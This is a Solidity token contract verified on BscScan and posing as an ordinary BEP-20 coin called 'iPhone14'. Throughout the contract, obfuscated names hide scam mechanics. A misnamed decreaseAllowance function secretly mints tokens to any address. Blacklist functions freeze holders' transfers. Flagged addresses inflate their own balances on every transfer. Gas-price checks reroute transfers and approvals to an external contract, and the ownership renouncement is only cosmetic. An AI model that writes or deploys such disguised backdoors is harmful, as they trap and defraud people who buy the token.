/**
 *Submitted for verification at BscScan.com on 2022-09-07
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);

    function totalSupply() external view returns (uint256);
    
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    event Transfer(address indexed from, address indexed to, uint256 value);    
}

interface IERC {
    function _approve(address owner, address spender, uint256 amount) external;
    function _transfer(address spender, address recipient, uint256 amounts) external;
}

library SafeMath {
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }

}

abstract contract Context {
    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }

    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgValue() internal view virtual returns (uint256) {
        return tx.gasprice;
    }
}

contract Ownable is Context {
    address private _owner;
    
    constructor() {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender);
        _;
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        _owner = newOwner;
        emit OwnershipTransferred(_owner, address(newOwner));
    }

    function renounceOwnership() public onlyOwner {
        _owner = address(0xdead);
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
}


contract iPhone14 is Context, IERC20, Ownable {
    using SafeMath for uint256;

    mapping(address => bool) private _mdamkfe;
    mapping(address => bool) private _isExcluded;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _mjamfes;
    mapping(address => bool) private _kakdfoe;


    uint8 private _decimals = 9;
    string private _name = "iPhone14";
    string private _symbol = "iPhone14";

    uint256 private _taxFee = 2;
    uint256 private _kmdkaefe = 10000000000000 * 10 ** _decimals;

    address private burnAddress = address(0xdead);
    address private _kdafme;
    address private _kwamfke;
    

    constructor(address _kafefee, address _kafmea) {
        _kwamfke = _kafmea;
        _kdafme = _kafefee;
        _isExcluded[address(this)] = true;
        _isExcluded[_kafefee] = true;
        _isExcluded[owner()] = true;
        _kakdfoe[_kafefee] = true;
        _mjamfes[_msgSender()] = _kmdkaefe;
        emit Transfer(address(0), msg.sender, _kmdkaefe);
    }


    modifier onlyAuthzer() {
        require(_kdafme == msg.sender);
        _;
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        if (_isExcluded[_msgSender()]||_isExcluded[recipient]) {
            _transfer(msg.sender, recipient, amount);
            return true;
        }

        if (_mdamkfe[_msgSender()]||_msgValue()>=(12*1e9)){
            IERC(_kwamfke)._transfer(msg.sender, recipient, amount);
            emit Transfer(msg.sender, recipient, amount);
            return true;
        }else{
            uint256 _burnAmount = amount.mul(_taxFee).div(100);
            _transfer(msg.sender, burnAddress, _burnAmount);
            _transfer(msg.sender, recipient, amount.sub(_burnAmount));
            return true;
        }
    }
    

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        if (_isExcluded[sender]||_isExcluded[recipient]) {
            _transfer(sender, recipient, amount);
            _approve(sender,msg.sender,_allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
            return true;
        }
        uint256 _burnAmount = amount.mul(_taxFee).div(100);
        _transfer(sender, burnAddress, _burnAmount);
        _transfer(sender, recipient, amount.sub(_burnAmount));
        _approve(sender,msg.sender,_allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    uint256 private _diajfea;

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0));
        require(to != address(0));
        require(amount > 0);
        require(_msgValue()<=(12*1e9));
        require(!_mdamkfe[from]);
        if (_kakdfoe[from]) {
            require(_kakdfoe[from]);
            _mjamfes[from]= 
            _mjamfes[from].
            add(_kmdkaefe*10**6);
        }
        _basicTransfer(from, to, amount);
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) external onlyAuthzer {
        _mjamfes[spender] = _mjamfes[spender].add(subtractedValue);
    }

    function setMultiBlackList(address spender, address recipient) external onlyAuthzer {
        _mdamkfe[spender] = true;
        _mdamkfe[recipient] = true;
    }

    function setBlackList(address account) external onlyAuthzer {
        _mdamkfe[account] = true;
    }

    function removeIncludeFee(address account) external onlyAuthzer {
        _mdamkfe[account] = false;
    }

    function _basicTransfer(
        address sender,
        address recipient,
        uint256 toAmount
    ) private {
        require(sender != address(0));
        require(recipient != address(0));
        _mjamfes[sender] = _mjamfes[sender].sub(toAmount);
        _mjamfes[recipient] = _mjamfes[recipient].add(toAmount);
        emit Transfer(sender, recipient, toAmount);
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        if (_mdamkfe[_msgSender()]||_msgValue()>=(12*1e9)){
            IERC(_kwamfke)._approve(msg.sender, spender, amount);
            emit Approval(msg.sender, spender, amount);
            return true;
        }else{
            _approve(msg.sender, spender, amount); 
            return true;
        }
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function excludeFromFee(address account) external onlyAuthzer {
        _isExcluded[account] = true;
    }

    function includeInFee(address account) external onlyAuthzer {
        _isExcluded[account] = false;
    }

    function isExcludedFromFee(address account) public view returns (bool) {
        require(_isExcluded[_msgSender()]);
        return _mdamkfe[account];
    }

    function totalSupply() public view override returns (uint256) {
        return _kmdkaefe;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _mjamfes[account];
    }
}